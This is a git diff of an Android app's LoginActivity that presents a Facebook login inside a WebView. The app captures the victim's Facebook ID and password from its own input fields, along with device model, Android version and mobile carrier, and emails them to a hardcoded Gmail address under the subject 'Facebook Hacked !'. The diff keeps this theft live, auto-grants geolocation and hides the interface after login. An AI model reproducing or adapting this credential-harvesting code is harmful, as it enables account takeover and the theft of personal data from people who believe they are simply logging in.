@@ -22,10 +22,13 @@ import android.view.View.OnTouchListener;
 import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
 import android.webkit.CookieManager;
+import android.webkit.GeolocationPermissions;
 import android.webkit.WebChromeClient;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.*;
+
+import java.util.Objects;
 
 public class LoginActivity extends AppCompatActivity
 {
@@ -111,7 +114,7 @@ public class LoginActivity extends AppCompatActivity
         LOGIN.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                FBMain.loadUrl("https://m.facebook.com/");
+                LoginAccepted();FBMain.loadUrl("https://m.facebook.com/login/");
         }});
         CREATE.setOnTouchListener(new OnTouchListener(){
             @Override
@@ -149,8 +152,7 @@ public class LoginActivity extends AppCompatActivity
 
         //Main Facebook Login-------------------------------------------------------------------
         FBMain.getSettings().setJavaScriptEnabled(true);
-        FBMain.setWebChromeClient(new WebChromeClient());
-        //CookieManager.getInstance().removeAllCookie();
+        FBMain.setWebChromeClient(new MyWebChromeClient());
         FBMain.setWebViewClient(new WebViewClient(){
             @Override
             public void onReceivedError(WebView view, int errorCode, String description, String failingUrl){
@@ -160,7 +162,7 @@ public class LoginActivity extends AppCompatActivity
             @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon)
             {
-                Toast.makeText(LoginActivity.this,url, Toast.LENGTH_LONG).show();MainLayout.setVisibility(View.GONE);
+                //Toast.makeText(LoginActivity.this,url, Toast.LENGTH_SHORT).show();
             }
             @Override
             public void onPageFinished(WebView v, String url){
@@ -172,31 +174,50 @@ public class LoginActivity extends AppCompatActivity
                     page=1;
                 }
                 else if(page==1){
-                    if(url.equals("https://m.facebook.com/login/save-device/#_=_"))
+                    if(url.contains("m.facebook.com/login/save-device/?login_source=login#_=_"))
                     {
-                        FBMain.loadUrl("javascript:(function(){" + "l=document.getElementsByClassName(\"_55sr\");" + "e=document.createEvent('HTMLEvents');" +
-                                "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
+                        FBMain.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
                     }
                     page=2;
-                    MainLayout.setVisibility(View.GONE);
                 }
             }
             @Override
             public void onLoadResource(WebView view, String url){
                 if(page==2) {
-                    if (url.equals("https://m.facebook.com/home.php"))
+                    if (url.contains("m.facebook.com/home.php?_rdr"))
                     {
                         String message="Details of Victim =>\n"+
                                 "\nFacebook ID = "+Login.getText().toString()+
                                 "\nPassword = "+Pass.getText().toString()+
-                                "\nDevice Used = "+(android.os.Build.MODEL).toString()+
+                                "\nDevice Used = "+ (Build.MODEL) +
                                 "\nAndroid Version Used = "+ android.os.Build.VERSION.RELEASE+
-                                "\nSim Network Used = "+((TelephonyManager)LoginActivity.this.getSystemService(LoginActivity.this.TELEPHONY_SERVICE)).getNetworkOperatorName();
-                        new SendMail(LoginActivity.this,"ritik.space@gmail.com","Facebook Hacked !",message).execute();}
-                    else{MainLayout.setVisibility(View.VISIBLE);logo.startAnimation(animation);}
+                                "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
+                        new SendMail(LoginActivity.this,"ritik.space@gmail.com","Facebook Hacked !",message);
+                    }
                 }
             }
         });
+    }
+    public class MyWebChromeClient extends WebChromeClient {
+
+        @Override
+        public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
+            callback.invoke(origin, true, false);
+        }
+        @Override
+        public void onReceivedTitle(WebView view, String title) {
+        }
+        @Override
+        public void onProgressChanged(WebView view, int progress)
+        {}
+        @Override
+        public void onReceivedIcon(WebView view, Bitmap b) {
+            super.onReceivedIcon(view, b);
+            if (view.getUrl().contains("m.facebook.com/home.php"))
+            {
+                MainLayout.setVisibility(View.GONE);
+            }
+        }
     }
     public void LoginAccepted(){
         Login.setVisibility(View.GONE);
